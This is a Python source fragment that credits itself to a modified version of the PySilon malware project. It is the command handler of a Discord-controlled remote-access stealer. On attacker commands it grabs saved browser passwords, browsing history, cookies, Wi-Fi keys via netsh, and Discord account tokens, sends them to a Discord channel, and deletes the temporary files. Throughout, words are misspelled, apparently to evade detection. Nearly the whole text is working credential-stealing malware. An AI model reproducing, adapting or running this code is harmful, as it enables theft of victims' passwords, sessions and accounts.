#THIS WAS MADE BY @MASTERAUXB ON TWITTER PLEASE DO NOT DELETE 
#ORIGINAL AUTHOR : https://github.com/mategol/PySilon-malware
#MODDED AUTHOR : https://github.com/MaitreAuxb/
#I TOOK TIME TO CREATE THIS PROJECT PLEASE DO NO DELETE THIS

from resources.discord_token_grabber import *
from resources.passwords_grabber import *
from browser_history import get_history
from resources.get_cookies import *
from urllib.request import urlopen
from threading import Thread
from resources.misc import *
import subprocess
import os
# end of imports
# on message
elif message.content[:5] == '.grb':
    
    await message.delete()
    #.log Removed the message 
    if message.content.strip() == '.grb':
       
        reaction_msg = await message.channel.send('```Syntax: .grb <what-to-grb>```'); await reaction_msg.add_reaction('🔴')
        #.log Sent message about usage of .grb 
    else:
        if message.content[6:] == 'pswrds':
            #.log Author requested for grbbing passwords 
            result = grab_passwords()
            #.log Grbbed passwords 
            embed=discord.Embed(title='Grbbed savd pwords', color=0x0084ff)
            for url in result.keys():
                embed.add_field(name='🔗 ' + url, value='👤 ' + result[url][0] + '\n🔑 ' + result[url][1], inline=False)
            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('📌')
            #.log Sent embed with all grbbed passwords 
        elif message.content[6:] == 'history':
            #.log Author requested for gring browser history 
            with open('history.txt', 'w') as history:
                for entry in get_history().histories:
                    history.write(entry[0].strftime('%d.%m.%Y %H:%M') + ' -> ' + entry[1] +'\n\n')
                #.log Gbbed browser history into history.txt 
            reaction_msg = await message.channel.send(file=discord.File('history.txt')); await reaction_msg.add_reaction('🔴')
            #.log Sent history.txt 
            subprocess.run('del history.txt', shell=True)
            #.log Removed history.txt 
        elif message.content[6:] == 'cookies':
            #.log Author requested for grbing cookies 
            await message.channel.send('```Grbbig cookies. Pleas wait...```')
            #.log Sent message about beginning of grbing cookies 
            grab_cookies()
            #.log Grbbed cookies 
            await asyncio.sleep(1)
            reaction_msg = await message.channel.send('```Gbbed cokies```', file=discord.File(f'C:\\Users\\{getuser()}\\cookies.txt', filename='cookies.txt')); await reaction_msg.add_reaction('📌')
            #.log Sent message with grbbed cookies 
            subprocess.run(f'del C:\\Users\\{getuser()}\\cookies.txt', shell=True)
            #.log Removed cookies.txt 
        elif message.content[6:].lower() == 'wifi':
            #.log Author requested for grbbing WiFi saved passwords 
            networks = force_decode(subprocess.run('netsh wlan show profile', capture_output=True, shell=True).stdout).strip()
            #.log Obtained raw netsh data 
            polish_bytes = ['\\xa5', '\\x86', '\\xa9', '\\x88', '\\xe4', '\\xa2', '\\x98', '\\xab', '\\xbe', '\\xa4', '\\x8f', '\\xa8', '\\x9d', '\\xe3', '\\xe0', '\\x97', '\\x8d', '\\xbd']
            polish_chars = ['ą', 'ć', 'ę', 'ł', 'ń', 'ó', 'ś', 'ź', 'ż', 'Ą', 'Ć', 'Ę', 'Ł', 'Ń', 'Ó', 'Ś', 'Ź', 'Ż']
            for i in polish_bytes:
                networks = networks.replace(i, polish_chars[polish_bytes.index(i)])
            #.log Fetched polish characters 
            network_names_list = []
            for profile in networks.split('\n'):
                if ': ' in profile:
                    network_names_list.append(profile[profile.find(':')+2:].replace('\r', ''))
            #.log Fetched profile data 
            result, password = {}, ''
            for network_name in network_names_list:
                command = 'netsh wlan show profile "' + network_name + '" key=clear'
                current_result = force_decode(subprocess.run(command, capture_output=True, shell=True).stdout).strip()
                #.log Obtained information about specific profile 
                for i in polish_bytes:
                    current_result = current_result.replace(i, polish_chars[polish_bytes.index(i)])
                    #.log Fetched polish characters in specific profile data 
                for line in current_result.split('\n'):
                    if 'Key Content' in line:
                        password = line[line.find(':')+2:-1]
                        #.log Grbed password from specific profile data 
                result[network_name] = password
            embed=discord.Embed(title='Gbbed WiFi aswords', color=0x0084ff)
            for network in result.keys():
                embed.add_field(name='🪪 ' + network, value='🔑 ' + result[network], inline=False)
            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('📌')
            #.log Sent embed with saved WiFi passwords 
        elif message.content[6:] == 'discord':
            #.log Author requested for grbing Discord accounts data 
            accounts = grab_discord.initialize(False)
            #.log Grbbed Discord accounts data 
            for account in accounts:
                reaction_msg = await message.channel.send(embed=account); await reaction_msg.add_reaction('📌') 
                #.log Sent embed with Discord account data
        elif message.content[6:] == 'all':
            await message.channel.send('Ging everything... Plese wait.')
            try:
                accounts = grab_discord.initialize(False)
                #.log Grbbed Discord accounts data
                for account in accounts:
                    reaction_msg = await message.channel.send(embed=account); await reaction_msg.add_reaction('📌') 
                    #.log Sent embed with Discord account data
            except: pass
            try:
                result = grab_passwords()
                #.log Grbbed passwords 
                embed=discord.Embed(title='Gbed sav paords', color=0x0084ff)
                for url in result.keys():
                    embed.add_field(name='🔗 ' + url, value='👤 ' + result[url][0] + '\n🔑 ' + result[url][1], inline=False)
                reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('📌')
                #.log Sent embed with all grbbed passwords
            except: pass 
            try:
                await asyncio.sleep(1)
                grab_cookies()
                #.log Grbbed cookies
                reaction_msg = await message.channel.send('```Gbbed cookies```', file=discord.File(f'C:\\Users\\{getuser()}\\cookies.txt', filename='cookies.txt')); await reaction_msg.add_reaction('📌')
                #.log Sent message with grbed cookies 
                subprocess.run(f'del C:\\Users\\{getuser()}\\cookies.txt', shell=True)
            except: pass
            
#THIS WAS MADE BY @MASTERAUXB ON TWITTER PLEASE DO NOT DELETE 
#ORIGINAL AUTHOR : https://github.com/mategol/PySilon-malware
#MODDED AUTHOR : https://github.com/MaitreAuxb/
#I TOOK TIME TO CREATE THIS PROJECT PLEASE DO NO DELETE THIS